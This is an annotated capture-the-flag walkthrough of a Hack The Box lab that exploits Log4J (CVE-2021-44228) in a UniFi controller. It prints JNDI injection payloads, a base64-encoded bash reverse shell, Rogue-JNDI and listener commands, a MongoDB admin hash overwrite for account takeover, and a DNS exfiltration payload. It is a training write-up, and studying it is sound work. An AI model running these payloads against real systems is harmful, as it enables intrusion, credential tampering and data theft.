# Log4J exploit on an UniFi system

From the official HTB write-up (prepared by "pwnix"): *This writeup explores the effects of exploiting Log4J in a very well known network appliance monitoring system called "UniFi". This box will show you how to set up and install the necessary packages and tools to exploit UniFi by abusing the Log4J vulnerability and manipulate a POST header called ```remember```, giving you a reverse shell on the machine. You'll also change the administrator's password by altering the hash saved in the MongoDB instance that is running on the system, which will allow access to the administration panel and leads to the disclosure of the administrator's SSH password.*

Note: In some applications, a "remember" or similar header might be used to indicate that a user wants their session or authentication to persist beyond the current session. It’s often linked to "Remember Me" functionality where users stay logged in even after closing their browser. If we managed to exploit it, it’s likely because the application processed the "remember" header in a way that we could manipulate. For example, if the application uses the value from the "remember" header in an unsafe manner (e.g., unsanitized input), we might be able to inject malicious payloads.

And now back to the write-up: *The scan reveals port 8080 open running an HTTP proxy. The proxy appears to redirect requests to port 8443, which seems to be running an SSL web server. We take note that the HTTP title of the page on port 8443 is " UniFi Network ".*

*Upon accessing the page using a browser we are presented with the UniFi web portal login page and the version number is 6.4.54. If we ever come across a version number it’s always a great idea to research that particular version on Google. A quick Google search using the keywords UniFy 6.4.54 exploit reveals an [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) that discusses the in-depth exploitation of the [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) vulnerability within this application.*

*This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection), which is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running the application and typically fully compromise the application and all its data.*

*To determine if this is the case, we can use FoxyProxy after making a POST request to the ```/api/login``` endpoint, to pass on the request to BurpSuite, which will intercept it as a middle-man. The request can then be edited to inject commands.*

*First, we attempt to login to the page with the credentials ```test:test``` as we aren’t trying to validate or gain access. The login request will be captured by BurpSuite and we will be able to modify it. Before we modify the request, let's send this HTTPS packet to the ```Repeater``` module of BurpSuite by pressing ```CTRL+R```.*

*Next, we input the payload into the ```remember``` field as shown below so that we can identify an injection point if one exists. If the request causes the server to connect back to us, then we have verified that the application is vulnerable.*

```
${jndi:ldap://{Tun0 IP Address}/whatever}
```

For example:

```
${jndi:ldap://10.10.14.244/whatever}
```

Here is the request from my Kali machine:

```
POST /api/login HTTP/1.1
Host: 10.129.96.149:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://10.129.96.149:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Content-Length: 68
Origin: https://10.129.96.149:8443
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{
	"username":"test",
	"password":"test",
	"remember":"${jndi:ldap://10.10.14.244/whatever}",
	"strict":true
}
```

Notes:

**JNDI** is the acronym for the ```Java Naming and Directory Interface API```. By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.

**LDAP** is the acronym for ```Lightweight Directory Access Protocol```, which is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is ```port 389```.

*After we hit "send" the "Response" pane will display the response from the request. The output shows us an error message stating that the payload is invalid, but despite the error message the payload is actually being executed.*

Here is how it looks like on my Kali machine:

```
HTTP/1.1 400 
vary: Origin
Access-Control-Allow-Origin: https://10.129.96.149:8443
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials
X-Frame-Options: DENY
Content-Type: application/json;charset=UTF-8
Content-Length: 64
Date: Tue, 10 Sep 2024 14:56:32 GMT
Connection: close

{
  "meta":{
    "rc":"error",
    "msg":"api.err.InvalidPayload"
   },
   "data":[
   ]
}
```

*Let's proceed to starting ```tcpdump``` on port ```389```, which will monitor the network traffic for LDAP connections. Open up another terminal and type:*

```
sudo tcpdump -i tun0 port 389
```

*After tcpdump has been started, click the Send button.*

Here is the output from my Kali machine:

```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:06:50.822045 IP 10.129.96.149.57106 > 10.10.14.244.ldap: Flags [S], seq 1114292549, win 64240, options [mss 1340,sackOK,TS val 3096497717 ecr 0,nop,wscale 7], length 0
17:06:50.822069 IP 10.10.14.244.ldap > 10.129.96.149.57106: Flags [R.], seq 0, ack 1114292550, win 0, length 0
```

*The tcpdump output shows a connection being received on our machine. This proves that the application is indeed vulnerable since it is trying to connect back to us on the LDAP port 389.*

*We will have to install Open-JDK and Maven on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system.*

```
sudo apt-get install openjdk-11-jdk -y
```

And:

```
sudo apt-get install maven
```

*Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is an Integrated Development Environment (IDE) that can be used to create a structured project and compile our projects into ```jar``` files. These applications will also help us run the ```rogue-jndi``` Java application, which starts a local LDAP server and allows us to receive connections back from the vulnerable server and execute malicious code.*

*Once we have installed the required packages, we now need to download and build the ```Rogue-JNDI``` Java application. Let's clone the respective repository and build the package using Maven.*

```
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

After successful operation we should see output like this:

```
(...)
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  19.800 s
[INFO] Finished at: 2024-09-10T17:15:47+02:00
[INFO] ------------------------------------------------------------------------
```

*This will create a ```.jar``` file in ```rogue-jndi/target/``` directory called ```RogueJndi-1.1.jar```. Now we can construct our payload to pass into the ```RogueJndi-1-1.jar``` Java application. To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.*

```
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.244/4444 0>&1"' | base64
```

*In this case we will be using port 4444 to receive the shell.*

Note: The ```-n``` flag with ```echo``` prevents a newline character from being added at the end, which sometimes causes issues. Also, added quotes around the Bash command for better parsing.

*After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of the ```--command``` option and your ```tun0``` IP address to the ```--hostname``` option. For example:*

```
java -jar target/RogueJndi-1.1.jar --command 'bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDQvNDQ0NCAwPiYxIg==}|{base64,-d}|{bash,-i}' --hostname 10.10.14.244
```

Note: Use single quotes ```'``` instead of double quotes ```"``` for the ```--command``` argument to prevent shell interpretation of special characters. Ensure there's no unnecessary space between elements like ```|```.

Here is the output from my Kali machine:

```
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.244:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.14.244:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.244:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.244:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.244:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.244:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.244:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.244:1389/o=tomcat to artsploit.controllers.Tomcat
```

*Now that the server is listening locally on port 389, let's open another terminal and start a Netcat listener to capture the reverse shell.*

```
ncat -lvp 4444
```

*Going back to our intercepted POST request, let's change the payload to:*

```
${jndi:ldap://10.10.14.244:1389/o=tomcat}
````

For example:

```
"remember":"${jndi:ldap://10.10.14.244:1389/o=tomcat}",
```

*Now we can click "send". After sending the request, a connection to our rogue server is received and the following message is shown.*

```
Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
```

*Once we receive the output from the Rogue server, a shell spawns on our Ncat listener and we can upgrade the terminal shell using the following command:*

```
script /dev/null -c bash
```

Here is the output from my listener:

```
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.96.149:45918.
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
unifi@unified:/usr/lib/unifi$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ 
```

*The above command will turn our shell into an interactive shell that will allow us to interact with the system more effectively. From here we can easily hunt for the user flag.*

```
find / -name user.txt 2>/dev/null
```

## Privilege Escalation

*The article states we can get access to the administrator panel of the UniFi application and possibly extract SSH secrets used between the appliances. First let's check if MongoDB is running on the target system, which might make it possible for us to extract credentials in order to login to the administrative panel.*

```
ps aux | grep mongo
```

Note: The ```aux``` in the ```ps aux``` command are options that control what information about running processes is displayed:

- ```a```: Displays processes from all users, not just your own.

- ```u```: Displays the processes in a user-oriented format, showing details like the username, CPU usage, memory usage, etc.

- ```x```: Shows processes that aren't attached to a terminal (e.g., background or daemon processes like MongoDB).

Here is the output from my Kali machine:

```
unifi         67  0.2  4.1 1100676 84744 ?       Sl   14:47   0:21 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       3577  0.0  0.0  11468  1140 pts/0    S+   16:55   0:00 grep mongo
unifi@unified:/usr/lib/unifi$ 
```

*We can see MongoDB is running on the target system on port 27117*

**MongoDB is a source-available cross-platform document-oriented database program. Classified as a NoSQL database program, MongoDB uses JSON-like documents with optional schemas.**

*Let's interact with the MongoDB service by making use of the ```mongo``` command line utility and attempting to extract the administrator password. A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is ```ace```.*

```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

The output is quite substantial, but the relevant piece of information from my Kali machine looks like this:

```
"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
```

*The output reveals a user called Administrator. Their password hash is located in the ```x_shadow``` variable but in this instance it cannot be cracked with any password cracking utilities. Instead we can change the ```x_shadow``` password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the ```mkpasswd``` command line utility.*

```
mkpasswd -m sha-512 Password1234
$6$TCiFrNJeGNrYtKzm$X/rfG0R2BBCij8pXDaM1KcAxqQGrhiWhNWH2LFzhIzxe6ydJdYAQpRCjY7qiDiIELXpKq23blZSldlLjWN1Ft0
```

*The ```$6$``` is the identifier for the hashing algorithm that is being used, which is SHA-512 in this case, therefore we will have to make a hash of the same type.*

Note: there is a tool for this purpose called ```hashid```. For example:

```
echo '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.' > hash.txt
hashid -m hash.txt
```

And the output looks like:

```
--File 'hash.txt'--
Analyzing '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.'
[+] SHA-512 Crypt [Hashcat Mode: 1800]
--End of file 'hash.txt'--  
```

Another option is simply running the ```hash-identifier``` command.

*Let's proceed to replacing the existing hash with the one we created.*

```
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
```

For example:

```
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$F.Uy.deXGeSYMQRw$aDsN8oDYaT5eTD0C9Q8zQGuTsGM06hq6TdOd1I1MYKAwFN5QmvygAj8n7dIDQWvknEaM.iXl2wLrKW8RKEdST/"}})'
```

Here is the output from my Kali machine:

```
unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$F.Uy.deXGeSYMQRw$aDsN8oDYaT5eTD0C9Q8zQGuTsGM06hq6TdOd1I1MYKAwFN5QmvygAj8n7dIDQWvknEaM.iXl2wLrKW8RKEdST/"}})'
<YKAwFN5QmvygAj8n7dIDQWvknEaM.iXl2wLrKW8RKEdST/"}})'
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
unifi@unified:/usr/lib/unifi$ 
```

*Let's now visit the website and log in as administrator . It is very important to note that the username is case sensitive. The authentication process was successful and we now have administrative access to the UniFi application.*

*UniFi offers a setting for SSH Authentication, which is a functionality that allows you to administer other Access Points over SSH from a console or terminal.*

*Navigate to ```settings -> site``` and scroll down to find the SSH Authentication setting. SSH authentication with a root password has been enabled.*

*The page shows the root password in plaintext. Let's attempt to authenticate to the system as root over SSH.*

```
ssh root@10.129.96.149
```

*The connection is successful and the root flag can be found using my trusted command:*

```
find / -name root.txt 2>/dev/null
```

This example is now concluded.

## Understanding the Log4j Vulnerability

1. **What is Log4j?** Log4j is a widely-used Java library developed by the Apache Software Foundation, initially created in 2001. It allows developers to manage logging (i.e., recording messages about the application’s operation) through configuration files rather than embedding print statements directly in the code. This makes it easier to adjust what gets logged and how it’s formatted without changing the code itself.

2. **How Does Logging Work?** Instead of manually inserting print statements into code to track issues, developers use Log4j to create log messages. The library reads configuration files to determine which log levels (e.g., INFO, WARN, DEBUG) should be recorded. This setup helps developers quickly enable detailed logging for troubleshooting when problems arise.

3. **What is the Vulnerability?** The Log4j vulnerability is a type of Expression Evaluation vulnerability. It becomes problematic when an attacker can control the content that ends up in logs. This is common because logs often include user input or other data from external sources. For example, in an FTP server, usernames might be logged. If an attacker can control the username field, they can inject malicious data.

4. **How Does the Exploit Work?** The exploit leverages Log4j’s ability to process certain expressions. For example, by including something like ```${jndi:ldap://<attacker-controlled-domain>/a}``` in a loggable field, an attacker can trick Log4j into querying an LDAP server controlled by them. This can lead to various malicious outcomes, including data exfiltration or remote code execution. In other words, when Log4j encounters a JNDI expression, it tries to connect to the specified LDAP server. If the LDAP server is controlled by an attacker, it can respond with a payload that Log4j will process. This might include Java classes or other data that can lead to remote code execution or other malicious actions.

5. **How Do You Test for Vulnerability?** To test if an application is vulnerable, attackers use techniques like injecting ```${jndi:ldap://<DNS-Canary-Token>/a}``` into input fields. A DNS Canary Token is a unique domain that alerts the attacker when it is accessed. If the application queries this domain, it indicates a potential vulnerability.

6. **Why Use DNS for Exploitation?** DNS is a reliable method for exfiltrating data because it’s hard to block and doesn’t reveal the original requestor’s IP address. For instance, using ```${jndi:ldap:///${sys:java.version}.YourDomain.com/}``` allows attackers to exfiltrate information about the Java version by embedding it into the DNS request. The data sent is not directly visible in network traffic, making it easier for attackers to gather information stealthily.

7. **What are Canary Tokens?** Canary Tokens are tools used to detect vulnerabilities and monitor for attacks. They are unique, internet-accessible services that notify the creator when accessed. DNS-based canaries are effective because DNS queries are difficult to block and don’t reveal the requestor’s IP address, making them a useful method for tracking and catching attackers.

8. **Why LDAP?** LDAP is used in the Log4j vulnerability because it’s a common directory service protocol that JNDI interacts with. LDAP is a protocol used for accessing and maintaining distributed directory information services. It’s commonly used for things like user directories, authentication services, and more. In the context of JNDI, LDAP is one of the directory services JNDI can interact with. The vulnerability arises from Log4j’s handling of JNDI lookups via LDAP, allowing attackers to inject and execute malicious payloads through LDAP responses.

## How the Payload Works

1. JNDI Lookup with LDAP:

- JNDI URI Structure: The payload ```${jndi:ldap:///${sys:java.version}.YourDomain.com/}``` is an example of a JNDI URI where ```ldap://``` specifies the protocol, and the rest is the address of the LDAP server.

- Dynamic Subdomain Injection: The ```${sys:java.version}``` part is a JNDI expression that dynamically injects the Java version of the server into the URI. For instance, if the server is running Java 11, the URI might become ```ldap://11.YourDomain.com/```.

2. DNS Interaction:

- Subdomain Request: In this example, ```YourDomain.com``` is a domain controlled by the attacker. The URI causes the server to make an LDAP request to a subdomain that includes the Java version, e.g., ```11.YourDomain.com```.

- DNS Lookup: When the server tries to perform the LDAP lookup, it first resolves the domain name part of the URI. This involves a DNS lookup for ```11.YourDomain.com```.

- DNS Query: The DNS query sends a request from the vulnerable server to the attacker's DNS server. The DNS server responds with information about the domain.

3. Why DNS?

- Data Exfiltration: Using DNS for the payload allows attackers to extract data from the vulnerable server. Since DNS queries are generally less scrutinized and harder to block, they offer a stealthy way to exfiltrate information.

- No Direct LDAP Communication: Instead of making a direct LDAP request that could be more obvious, the payload uses DNS to carry out the attack. The DNS request carries the Java version or other data, which the attacker’s DNS server logs. This makes it easier for the attacker to gather information without triggering obvious alerts.

4. Practical Example:

- Suppose an attacker’s domain is example.com. The payload ```${jndi:ldap:///${sys:java.version}.example.com/}``` could result in a DNS query for ```11.example.com``` if the server is running Java 11.

- The attacker’s DNS server receives this request and logs it, giving them insight into the Java version or other data injected into the subdomain. This data could be used for further exploitation or reconnaissance.

Overall, The payload ```${jndi:ldap:///${sys:java.version}.YourDomain.com/}``` exploits the Log4j vulnerability by making the vulnerable server perform a DNS lookup. The DNS query includes dynamically inserted data (like the Java version), which is then logged by the attacker’s DNS server. This method allows attackers to exfiltrate data or gather information in a way that is less likely to be detected.
